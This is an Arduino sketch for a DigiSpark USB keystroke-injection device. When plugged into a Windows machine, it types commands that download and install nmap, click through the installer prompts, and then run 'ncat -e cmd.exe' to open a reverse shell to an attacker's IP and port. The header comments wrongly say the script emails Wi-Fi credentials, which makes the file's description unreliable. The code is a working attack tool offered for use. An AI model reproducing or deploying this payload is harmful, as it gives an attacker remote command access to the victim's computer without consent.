//This DigiSpark script writes the wireless network credentials to a csv file and emails it.
//Credits to p0wc0w.

//NOTE about the New Version of this script: The older script stopped working on newer builds of Windows 10
//since Windows 10 now require an elevated cmd or powershell to execute these commands. This version should
//be faster (better, stronger...) and should work on all builds of Windows 10. For previous versions 
//of Windows or simply older builds of Windows 10, the other version works like a charm.

#include "DigiKeyboard.h"

#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F

void setup() {
}

void loop() {
  // first section is install process takes 8.1 mins assuming everything executes correctly
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("microsoftedge.exe"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("https://nmap.org/dist/nmap-7.92-setup.exe"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("downloads"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //opening install
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //agreeing to popup
  DigiKeyboard.delay(9000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //uncomment these lines if there is a chance nmap is already installed
  //DigiKeyboard.delay(30000);
  //DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  //DigiKeyboard.delay(1000);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300000); //waiting for install
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100000); //agreeing to secondary terms
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //agreeing to everything else
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //one more for good measure
  //at this point nmap will have finished installing and it is time to start the reverse shell process
  //if nmap hasn't fully installed then there was an error in the timings i would suggest replugging the digispark and starting the process over
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("ncat -e cmd.exe IP PORT")); //insert the ip of your attacking machine and the port it is listening on
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
